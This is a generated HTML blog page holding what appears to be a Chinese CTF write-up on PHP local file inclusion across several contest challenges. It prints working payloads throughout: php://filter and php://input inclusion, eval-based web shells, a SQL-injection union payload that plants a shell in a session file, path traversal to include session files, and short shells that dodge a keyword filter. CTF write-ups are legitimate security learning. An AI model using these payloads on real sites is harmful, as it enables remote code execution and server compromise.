@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>php文件包含 - Hexo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="&amp;#x201C;&amp;#x767E;&amp;#x5EA6;&amp;#x676F;&amp;#x201D;CTF&amp;#x6BD4;&amp;#x8D5B; 2017 &amp;#x4E8C;&amp;#x6708;&amp;#x573A;-include&amp;#x53EF;&amp;#x4EE5;&amp;#x4F7F;&amp;#x7528;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&amp;#x8BFB;&amp;#x53D6;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php文件包含">
+<meta property="og:url" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;#x201C;&amp;#x767E;&amp;#x5EA6;&amp;#x676F;&amp;#x201D;CTF&amp;#x6BD4;&amp;#x8D5B; 2017 &amp;#x4E8C;&amp;#x6708;&amp;#x573A;-include&amp;#x53EF;&amp;#x4EE5;&amp;#x4F7F;&amp;#x7528;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&amp;#x8BFB;&amp;#x53D6;&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png">
+<meta property="og:image" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png">
+<meta property="og:image" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png">
+<meta property="og:image" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png">
+<meta property="og:image" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png">
+<meta property="article:published_time" content="2019-12-03T15:56:23.000Z">
+<meta property="article:modified_time" content="2020-11-24T04:51:37.490Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            php文件包含
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-12-03T15:56:23.000Z" itemprop="datePublished">3 Dec 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/CTF/">CTF</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            5 minutes read (About 751 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h4 id="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;-include"><a href="#&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B;-2017-&#x4E8C;&#x6708;&#x573A;-include" class="headerlink" title="&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;-include"></a>&#x201C;&#x767E;&#x5EA6;&#x676F;&#x201D;CTF&#x6BD4;&#x8D5B; 2017 &#x4E8C;&#x6708;&#x573A;-include</h4><p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<br><code>php://filter/convert.base64-encode/resource=index.php</code>&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4F46;&#x662F;&#x6CA1;&#x5565;&#x7528;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;flag&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;<br>&#x6240;&#x4EE5;&#x4F7F;&#x7528;<br><code>http://ace46edd1c9f412eb50fa9cd198420223e7b80edf0ee4d9c.changame.ichunqiu.com/?path=php://input</code><br>post<br><code>&lt;?php system(&quot;ls&quot;);?&gt;</code>&#x8BFB;&#x53D6;&#x76EE;&#x5F55;<br><code>&lt;?php system(&quot;cat dle345aae.php | base64&quot;);?&gt;</code>&#x8BFB;&#x53D6;&#x5230;flag</p>
+<a id="more"></a>
+
+
+<h4 id="&#x767E;&#x5EA6;&#x676F;&#x5341;&#x4E8C;&#x6708;&#x2013;&#x770B;&#x770B;&#x6211;&#x7684;Notebook-session&#x6587;&#x4EF6;&#x5305;&#x542B;"><a href="#&#x767E;&#x5EA6;&#x676F;&#x5341;&#x4E8C;&#x6708;&#x2013;&#x770B;&#x770B;&#x6211;&#x7684;Notebook-session&#x6587;&#x4EF6;&#x5305;&#x542B;" class="headerlink" title="&#x767E;&#x5EA6;&#x676F;&#x5341;&#x4E8C;&#x6708;&#x2013;&#x770B;&#x770B;&#x6211;&#x7684;Notebook-session&#x6587;&#x4EF6;&#x5305;&#x542B;"></a>&#x767E;&#x5EA6;&#x676F;&#x5341;&#x4E8C;&#x6708;&#x2013;&#x770B;&#x770B;&#x6211;&#x7684;Notebook-session&#x6587;&#x4EF6;&#x5305;&#x542B;</h4><p><img src="1.png"><br>&#x4E4B;&#x540E;&#x5728;robots.txt&#x53D1;&#x73B0;php1nFo.php&#x6587;&#x4EF6;<br><code>http://ceb4e4f921b2444eaeb20d272f7a9cef79afe475f5c7447f.game.ichunqiu.com/action.php?module=php&amp;file=php1nFo</code><br>&#x53D1;&#x73B0;<br><img src="2.png"><br><img src="3.png"><br>poc<br>&#x6CE8;&#x518C;&#x7528;&#x6237;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x767B;&#x5F55;&#x7136;&#x540E;&#x67E5;&#x770B;&#x81EA;&#x5DF1;&#x7684;session</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID:e12gf61f8dqd0vfpg4ssntdpc7</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x7136;&#x540E;&#x8BBF;&#x95EE;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cd674daadfa14fda832ca1e08c3ad0853810ea5951d34a15.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_e12gf61f8dqd0vfpg4ssntdpc7</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="4.png"></p>
+<h4 id="2020&#x56DB;&#x53F6;&#x8349;&#x7684;&#x4E00;&#x4E2A;session&#x5305;&#x542B;"><a href="#2020&#x56DB;&#x53F6;&#x8349;&#x7684;&#x4E00;&#x4E2A;session&#x5305;&#x542B;" class="headerlink" title="2020&#x56DB;&#x53F6;&#x8349;&#x7684;&#x4E00;&#x4E2A;session&#x5305;&#x542B;"></a>2020&#x56DB;&#x53F6;&#x8349;&#x7684;&#x4E00;&#x4E2A;session&#x5305;&#x542B;</h4><p>&#x9996;&#x5148;&#x7ED9;&#x4E86;2&#x4E2A;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;phpinfo&#xFF0C;&#x4E00;&#x4E2A;&#x662F;lfi&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x5F00;&#x8FDC;&#x7A0B;&#x5305;&#x542B;&#xFF0C;&#x8BFB;&#x53D6;&#x5305;&#x542B;&#x90FD;&#x770B;&#x4E86;&#x4E00;&#x904D;&#x6CA1;&#x6709;flag<br>&#x8FD9;&#x6837;&#x8BFB;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x767B;&#x5F55;&#x7684;&#x6E90;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Content-Type: text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">require_once</span> <span class="hljs-string">&apos;config.php&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;username&apos;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;password&apos;</span>])){</span><br><span class="line">    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;username&apos;</span>];</span><br><span class="line">    <span class="hljs-variable">$password</span> = md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;password&apos;</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$con</span>-&gt;connect_error){</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;db connect error&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username=&apos;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&apos; and password=&apos;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&apos;&quot;</span>;</span><br><span class="line">    <span class="hljs-variable">$query</span> = <span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-variable">$sql</span>);</span><br><span class="line">    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$query</span>-&gt;fetch_array();</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$row</span>)){</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;username&apos;</span>] = base64_encode(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]);</span><br><span class="line">        header(<span class="hljs-string">&apos;Location: index.php&apos;</span>);</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">    }<span class="hljs-keyword">else</span>{</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&lt;br&gt;login error&apos;</span>);</span><br><span class="line">    }</span><br><span class="line"> }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x6709;&#x4E00;&#x4E2A;sql&#x6CE8;&#x5165;&#xFF0C;&#x767B;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;session&#x4E2D;&#x4F1A;&#x7559;&#x4E0B;&#x7528;&#x6237;&#x540D;&#x7684;base64&#x52A0;&#x5BC6;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username|s:8:&quot;YWRtaW4=&quot;;</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x540E;&#x9762;&#x662F;&#x7528;&#x6237;&#x7684;base64<br>&#x60F3;&#x4E86;&#x5F88;&#x4E45;&#x53EF;&#x4EE5;&#x5305;&#x542B;session&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;base64&#x52A0;&#x5BC6;&#x540E;&#x7ED5;&#x4E0D;&#x8FC7;&#x53BB;<br>&#x540E;&#x6765;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x518D;&#x7528;base64-decode&#x4E00;&#x6B21;&#x7ED5;&#x8FC7;-&#x4F46;&#x662F;&#x8FD8;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x524D;&#x9762;&#x7684;<code>username|s:8:&quot;</code>&#x548C;&#x540E;&#x9762;&#x7684;&#x4F1A;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;<br>&#x7ECF;&#x8FC7;&#x5B9E;&#x9A8C;&#x53D1;&#x73B0;&#x5982;&#x679C;&#x8FD9;&#x4E2A;base64&#x5B57;&#x7B26;&#x4E32;&#x8DB3;&#x591F;&#x957F;&#x662F;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#x524D;&#x9762;&#x7684;&#xFF0C;payload&#xFF1A;<br>&#x7528;&#x6237;&#x540D;&#x4E3A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000&apos; union select &apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php eval(\$_POST[\&apos;cmd\&apos;])?&gt;&apos;,3 #</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x5BC6;&#x7801;&#x968F;&#x610F;<br>session&#x5305;&#x542B;&#x5F97;&#x5230;<br><code>/index.php?action=/var/lib/php5/sess_3mck4o350rb2085cunu2mnajk6</code></p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username|s:120:&quot;YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKT8+&quot;;</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x518D;&#x7528;&#x4E00;&#x5C42;&#x89E3;&#x5BC6;<br><code>/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_3mck4o350rb2085cunu2mnajk6</code><br>&#x4E8B;&#x5B9E;&#x8BC1;&#x660E;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x7528;&#x6237;&#x540D;&#x524D;&#x9762;&#x5C31;&#x662F;&#x8981;&#x52A0;&#x5F88;&#x591A;pad&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x5F85;&#x8FDB;&#x4E00;&#x6B65;&#x8003;&#x5BDF;<br><img src="5.png"></p>
+<h4 id="NPUCTF-easyphp"><a href="#NPUCTF-easyphp" class="headerlink" title="NPUCTF_easyphp"></a>NPUCTF_easyphp</h4><p>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x65E0;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7559;&#x8A00;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>   header(<span class="hljs-string">&apos;content-type:application/json&apos;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>{</span><br><span class="line">	<span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$msg</span>)&gt;<span class="hljs-number">17</span>) {</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;msg is too loooong!&quot;</span>;</span><br><span class="line">	} <span class="hljs-keyword">else</span> {</span><br><span class="line">		<span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&quot;/php/&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$msg</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;msg&apos;</span>])&amp;<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;msg&apos;</span>]))<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;msg&apos;</span>] = <span class="hljs-keyword">array</span>();</span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;msg&apos;</span>])) {</span><br><span class="line">	array_push(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;msg&apos;</span>], [<span class="hljs-string">&apos;msg&apos;</span>=&gt;safe(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;msg&apos;</span>]),<span class="hljs-string">&apos;time&apos;</span>=&gt;date(<span class="hljs-string">&apos;Y-m-d H:i:s&apos;</span>,time())]);</span><br><span class="line">	<span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>([<span class="hljs-string">&apos;msg&apos;</span>=&gt;safe(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;msg&apos;</span>]),<span class="hljs-string">&apos;time&apos;</span>=&gt;date(<span class="hljs-string">&apos;Y-m-d H:i:s&apos;</span>,time())]));</span><br><span class="line">	<span class="hljs-keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;msg&apos;</span>])) {</span><br><span class="line">	<span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&apos;msg&apos;</span>]);</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?????????????????&#x20AC;???&quot;</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>&#x5927;&#x6982;&#x5C31;&#x662F;&#x628A;&#x4F60;&#x8981;&#x5B58;&#x7684;msg&#x4E22;&#x5728;session&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x6709;2&#x4E2A;&#x9650;&#x5236;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;17&#x957F;&#x5EA6;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x4ED6;&#x662F;&#x6570;&#x7EC4;&#x5F62;&#x5F0F;&#xFF0C;&#x4E5F;ban&#x4E86;php<br>&#x5B98;&#x65B9;&#x6015;payload</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$a=$_GET;/*</span><br><span class="line">*/$a[1]($a[2]);?&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x5F53;&#x65F6;&#x6211;&#x505A;&#x7684;&#x65F6;&#x5019;&#x7684;paylod,&#x5176;&#x5B9E;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;</p>
+<pre><code>&lt;?Php /*
+*/$a=$_GET;/*
+*/extract($a);/*
+*/eval($b);?&gt;
+</code></pre>
+</body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Web/">#Web</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/12/04/%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84cms%E5%92%8C%E6%A1%86%E6%9E%B6%E7%9A%84%E6%BC%8F%E6%B4%9E/">遇到过的cms和框架的漏洞</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/12/03/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">php文件上传</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("en-AU");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
